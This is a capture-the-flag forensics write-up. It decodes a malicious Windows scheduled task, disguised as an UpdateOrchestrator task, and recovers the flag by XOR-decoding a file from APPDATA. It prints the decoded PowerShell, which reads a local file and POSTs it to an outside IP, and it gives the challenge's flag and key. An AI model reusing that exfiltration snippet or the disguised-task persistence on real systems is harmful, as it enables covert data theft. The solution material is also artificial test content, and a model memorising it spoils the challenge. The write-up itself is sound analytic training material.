# Who's Cutting Onions

> Follow-up to "Please Schedule an Appointment". The decoded PowerShell pointed at the exfiltration IP; the same data also hides a key in a local file.
> **Flag:** `CTF{l1v1ng_0ff_th3_sch3dul3r_l4nd}`

---

## Solution

### 1. Decode the malicious task

```bash
$ grep -oP '(?<=-EncodedCommand ).*(?=</Arguments>)' \
    extracted/ScheduledTasks/Microsoft_Windows_UpdateOrchestrator_USO_UxBroker_Display.xml \
  | base64 -d | iconv -f UTF-16LE -t UTF-8
```

```powershell
$xk=0x37;$p="$env:APPDATA\Microsoft\Windows\Themes\aero.tmp";
$b=[System.IO.File]::ReadAllBytes($p);
$f=($b|%{[char]($_ -bxor $xk)})-join'';
[System.Net.WebClient]::new().UploadString("http://10.4.20.15/collect","POST",$f)
```

Two facts: the exfiltration URL (`10.4.20.15`) and the local data path plus the
key (`XOR 0x37`).

### 2. Apply the key

```bash
$ python3 -c "d=open('extracted/AppData/Roaming/Microsoft/Windows/Themes/aero.tmp','rb').read(); print(bytes(b^0x37 for b in d).decode())"
CTF{l1v1ng_0ff_th3_sch3dul3r_l4nd}
```

### 3. Rule out other artifacts

The ZIP has 13 entries (6 task XMLs, `aero.tmp`, directories), no comment and no
appended data. The other `EncodedCommand`
(`WindowsUpdate_AutomaticAppUpdate`) only runs `Get-WinEvent` and `Export-Csv` to
`$env:TEMP\wu_health.csv`.

### 4. Flag

```text
CTF{l1v1ng_0ff_th3_sch3dul3r_l4nd}
```

If the platform asks for the literal XOR key, it is `0x37`.

## Lesson

An encoded task action usually carries more than one secret. Decode it fully and
follow every path it touches, not only the network indicator.

---

### Source

Offline file analysis (no live instance).
